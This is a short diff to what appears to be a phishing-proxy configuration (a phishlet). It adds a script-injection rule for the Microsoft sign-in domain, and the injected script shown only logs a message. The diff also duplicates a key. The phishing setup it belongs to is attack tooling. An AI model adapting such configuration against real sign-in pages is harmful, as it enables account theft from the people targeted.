@@ -108,6 +108,14 @@ force_post:
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/login"]
+    script: |
+      function lp() { 
+        console.log("yeah")
+      }
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/*"]
     script: |
       // Generate random title
